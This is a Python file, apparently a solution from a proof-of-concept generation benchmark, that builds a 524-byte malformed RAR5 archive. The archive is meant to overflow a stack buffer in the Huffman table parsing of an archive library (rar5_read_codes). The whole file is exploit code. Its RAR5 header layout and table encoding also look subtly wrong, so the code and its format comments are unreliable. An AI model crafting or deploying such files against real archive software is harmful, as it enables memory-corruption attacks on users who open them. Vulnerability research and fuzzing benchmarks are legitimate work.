import os
import struct
import tempfile
import subprocess
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a stack buffer overflow in RAR5 Huffman table parsing.
        The vulnerability occurs when uncompressing Huffman tables with insufficient bounds checks.
        """
        # Create a minimal RAR5 archive that triggers the vulnerability
        # Based on analysis of RAR5 format and Huffman table parsing
        
        # RAR5 signature
        poc = bytearray()
        poc.extend(b'Rar!\x1a\x07\x01\x00')  # RAR5 signature
        
        # Archive header (type 1)
        # CRC32 placeholder - will be calculated later
        header_crc = 0
        header_size = 13  # 1 (type) + 2 (flags) + 4 (reserved1) + 4 (reserved2) + 2 (reserved3)
        
        # Archive header structure
        archive_header = bytearray()
        archive_header.append(0x01)  # Archive header type
        archive_header.extend(b'\x00\x00')  # Flags: 0
        archive_header.extend(b'\x00\x00\x00\x00')  # Reserved1
        archive_header.extend(b'\x00\x00\x00\x00')  # Reserved2
        archive_header.extend(b'\x00\x00')  # Reserved3
        
        # Calculate CRC32 for archive header
        crc = 0xFFFFFFFF
        for b in archive_header:
            crc ^= b
            for _ in range(8):
                crc = (crc >> 1) ^ (0xEDB88320 if crc & 1 else 0)
        header_crc = crc ^ 0xFFFFFFFF
        
        # Write archive header block
        poc.extend(struct.pack('<I', header_crc & 0xFFFFFFFF))
        
        # Write header size using variable-length encoding
        size = header_size
        if size < 0x80:
            poc.append(size)
        else:
            poc.append((size & 0x7F) | 0x80)
            poc.append((size >> 7) & 0xFF)
        
        poc.extend(archive_header)
        
        # Now create a file header with malformed compressed data
        # that triggers the buffer overflow in Huffman table parsing
        
        # File header (type 2)
        file_header = bytearray()
        file_header.append(0x02)  # File header type
        
        # Flags: HAS_DATA, DIRECTORY, UNKNOWN
        file_header.extend(b'\x01\x00')  # Flags with HAS_DATA bit set
        
        # File attributes/size fields
        file_header.extend(b'\x00\x00\x00\x00')  # Unpacked size: 0
        file_header.extend(struct.pack('<I', 0x8000))  # Data size: 32768 (large enough)
        file_header.extend(b'\x00\x00\x00\x00')  # File attributes
        file_header.extend(struct.pack('<I', 1))  # mtime
        file_header.extend(b'\x00\x00\x00\x00')  # CRC32
        file_header.extend(b'\x00\x00\x00\x00')  # Compression info
        
        # File name: just "x"
        file_header.append(1)  # Name length = 1
        file_header.extend(b'x')
        
        # Calculate file header size
        file_header_size = len(file_header)
        total_header_size = 1 + 2 + 4 + 4 + 4 + 4 + 4 + 4 + 1 + 1  # fields + name
        
        # Calculate CRC32 for file header
        crc = 0xFFFFFFFF
        for b in file_header:
            crc ^= b
            for _ in range(8):
                crc = (crc >> 1) ^ (0xEDB88320 if crc & 1 else 0)
        file_header_crc = crc ^ 0xFFFFFFFF
        
        # Write file header block
        poc.extend(struct.pack('<I', file_header_crc & 0xFFFFFFFF))
        
        # Write header size
        size = file_header_size
        if size < 0x80:
            poc.append(size)
        else:
            poc.append((size & 0x7F) | 0x80)
            poc.append((size >> 7) & 0xFF)
        
        poc.extend(file_header)
        
        # Now add the compressed data that triggers the vulnerability
        # This is where the Huffman table parsing vulnerability exists
        
        # Compression type: 3 (RAR5) with Huffman table
        compressed_data = bytearray()
        
        # Create malformed Huffman table data
        # The vulnerability is in rar5_read_codes() function which doesn't
        # properly validate the length when uncompressing Huffman tables
        
        # First, we need a reasonable looking start
        compressed_data.append(0x15)  # Some initial byte
        
        # Now create data that will cause buffer overflow
        # The Huffman table uses a simple compression scheme:
        # 0x00: literal zero
        # 0x01-0x7F: literal value
        # 0x80-0xFF: repeat count with value
        
        # We'll create a sequence that causes excessive writes
        # Fill buffer with many repeated values to overflow
        overflow_size = 600  # More than typical buffer (aiming for 524 total)
        
        # Start with some normal data
        compressed_data.append(0x10)  # Normal value
        compressed_data.append(0x20)  # Normal value
        
        # Now add repeating pattern that will cause overflow
        # Use high repeat counts
        for i in range(overflow_size // 2):
            compressed_data.append(0xFF)  # Maximum repeat count
            compressed_data.append(0x41)  # Value to repeat ('A')
        
        # Add some more to reach exactly 524 bytes
        current_len = len(poc) + len(compressed_data)
        remaining = 524 - current_len
        
        if remaining > 0:
            # Add padding to reach exactly 524 bytes
            compressed_data.extend(b'\x00' * remaining)
        
        poc.extend(compressed_data)
        
        # Ensure exactly 524 bytes
        if len(poc) > 524:
            poc = poc[:524]
        elif len(poc) < 524:
            poc.extend(b'\x00' * (524 - len(poc)))
        
        return bytes(poc)